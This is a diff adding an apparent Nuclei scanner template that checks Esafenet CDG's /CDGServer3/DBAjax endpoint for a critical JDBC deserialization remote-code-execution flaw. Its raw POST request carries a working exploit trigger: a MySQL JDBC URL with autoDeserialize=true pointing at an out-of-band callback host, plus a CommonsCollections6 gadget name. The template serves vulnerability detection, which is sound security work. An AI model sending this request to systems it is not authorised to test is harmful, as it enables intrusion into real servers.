@@ -1,0 +1,27 @@
+id: esafenet-cdg-dbajax-jdbc-rce
+
+info:
+  name: 亿赛通 /CDGServer3/DBAjax JDBC反序列化
+  author: SleepingBag945
+  severity: critical
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/DBAjax HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Connection: close
+
+        command=testConnection&userName=CommonsCollections6&password=&ip={{Host}}&configvalues=mysql|jdbc:mysql://{{interactsh-url}}:3306/test?detectCustomCollations=true%26autoDeserialize=true|com.mysql.jdbc.Driver
+
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction 
+        words:
+          - "dns"
+
